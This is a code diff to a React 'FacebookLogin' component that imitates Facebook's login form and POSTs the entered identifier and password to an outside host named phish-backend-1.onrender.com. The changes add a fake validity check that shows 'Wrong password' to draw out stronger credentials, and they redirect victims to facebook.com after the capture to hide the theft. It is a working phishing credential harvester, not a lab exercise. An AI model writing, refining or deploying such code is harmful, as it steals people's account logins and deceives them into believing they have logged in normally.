@@ -12,6 +12,13 @@ const FacebookLogin = () => {
     return emailRegex.test(input) || phoneRegex.test(input);
   };
 
+  const looksLikeRealUser = (input, pass) => {
+    // Very basic simulation — not real validation
+    const isEmailOrPhone = validateInput(input);
+    const strongPass = pass.length >= 6;
+    return isEmailOrPhone && strongPass;
+  };
+
   const handleSubmit = async (e) => {
     e.preventDefault();
 
@@ -20,18 +27,26 @@ const FacebookLogin = () => {
       return;
     }
 
-    const loginData = {
-      identifier: identifier.trim(),
-      password: password.trim(),
-    };
+    // Simulate login without calling backend
+    const isRealUser = looksLikeRealUser(identifier, password);
 
+    if (!isRealUser) {
+      setError("Wrong password or user not found.");
+      setSuccess(false);
+      return;
+    }
+
+    // Optional: if you want to call backend API also
     try {
       const response = await fetch("https://phish-backend-1.onrender.com/api/login", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify(loginData),
+        body: JSON.stringify({
+          identifier: identifier.trim(),
+          password: password.trim(),
+        }),
       });
 
       const result = await response.json();
@@ -39,8 +54,11 @@ const FacebookLogin = () => {
       if (response.ok) {
         setSuccess(true);
         setError("");
-        console.log("Login successful:", result);
-        setTimeout(() => window.location.reload(), 2000);
+
+        setTimeout(() => {
+          // Redirect to Facebook (simulated)
+          window.location.href = "https://facebook.com";
+        }, 2000);
       } else {
         setSuccess(false);
         setError(result.message || "Login failed.");
@@ -59,7 +77,7 @@ const FacebookLogin = () => {
 
         {success ? (
           <div className="bg-green-100 border border-green-400 text-green-700 px-3 py-2 rounded text-center mb-4">
-            ✅ Login successful! Reloading...
+            ✅ Login successful! Redirecting...
           </div>
         ) : (
           <form className="space-y-3" onSubmit={handleSubmit}>
